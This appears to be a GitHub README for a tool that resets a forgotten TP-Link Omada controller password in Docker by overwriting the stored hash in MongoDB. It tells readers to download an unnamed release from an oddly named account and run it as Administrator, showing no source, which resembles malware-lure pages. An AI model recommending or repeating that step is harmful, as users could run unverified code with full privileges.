# 🔑 omada-docker-password-reset - Recover your TP-Link Omada login access

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases)

This project provides a recovery method for TP-Link Omada SDN Controller users running inside a Docker container. Use this tool if you forgot your credentials and lose access to your dashboard. This guide walks you through the recovery steps on a Windows machine.

## 📋 Prerequisites

Before you start the recovery process, ensure you have these items ready:

*   A Windows computer connected to the same network as your Omada Controller.
*   Access to the device or server hosting the Omada Docker container.
*   A text editor like Notepad.
*   The IP address of your Omada Controller.
*   Administrative rights to access the Docker host settings.

## 📥 Downloading the Tool

You need to obtain the latest version of the script to begin.

1.  Visit the [official releases page](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases).
2.  Look for the latest release version at the top.
3.  Click the file link to download the package to your Windows 'Downloads' folder.
4.  Right-click the downloaded file and select 'Extract All' to view the script files.

## ⚙️ Preparation Steps

You must stop the Omada container before you attempt the password reset. This prevents data conflicts while the script modifies the database.

1.  Open your Docker management interface (such as Docker Desktop or your Unraid dashboard).
2.  Locate the Omada controller container in your list of running containers.
3.  Select the 'Stop' command to shut down the container.
4.  Confirm the container status changes to 'Stopped' or 'Exited'.
5.  Locate the persistent storage folder on your host machine where the Omada data exists. This folder typically contains the 'mongodb' files.

## 🛠 Running the Recovery

Follow these steps to reset the password.

1.  Navigate to the folder where you extracted the tool files.
2.  Open the included `instructions.txt` file to verify any version-specific updates.
3.  Right-click the recovery script file and select 'Run as Administrator'.
4.  A black window appears. Follow the on-screen prompts.
5.  Type the path to the folder containing your Omada MongoDB data when the script asks for the location.
6.  The tool displays a success message once it resets the database.
7.  Close the script window after you receive confirmation.

## 🚀 Finalizing Setup

Restart your container to return to normal operation. 

1.  Return to your Docker management interface.
2.  Select the Omada container.
3.  Click the 'Start' or 'Play' button to run the container.
4.  Wait two to three minutes for the Omada service to initialize.
5.  Open your web browser and navigate to the Omada login page.
6.  Log in using the default credentials that the tool instructions provide.
7.  Change your password immediately after you gain access to the dashboard.

## 💡 Troubleshooting Common Issues

If you encounter problems, review this list for common solutions.

*   **Access Denied:** If Windows prevents you from running the script, ensure you have full administrative rights on the host computer.
*   **Database Not Found:** Verify that you provided the correct path to the MongoDB folder. The path must point to the folder containing the specific Omada database files.
*   **Container Fails to Start:** Check your Docker logs for errors. Ensure the container has permission to read the files you just modified.
*   **Browser Login Fails:** Clear your browser cache or try an Incognito window to ensure your browser is not using old saved credentials.

## 🛡 Security Best Practices

After you successfully reset your password, take steps to secure your network management tools.

*   Store your new credentials in a physical notebook or a password manager.
*   Enable two-factor authentication if your version of the Omada Controller supports it.
*   Restrict access to the Omada dashboard to specific IP addresses within your local network firewall settings.
*   Update your Docker images regularly to ensure you have the latest security patches from the manufacturer.

## 🔍 Understanding the Process

The Omada Controller stores user credentials in a local MongoDB database file. When you forget your password, the system cannot verify your identity. This tool connects to that database file directly and overwrites the security hash with a known default value. This process does not delete your network configurations, wireless SSIDs, or connected client history. It only resets the login credentials for the administrative account. You perform a manual edit, so you must ensure the container remains off during the entire operation. If the container runs while you edit the database, you risk corrupting your network configuration files. Always verify that the container is completely stopped before you proceed.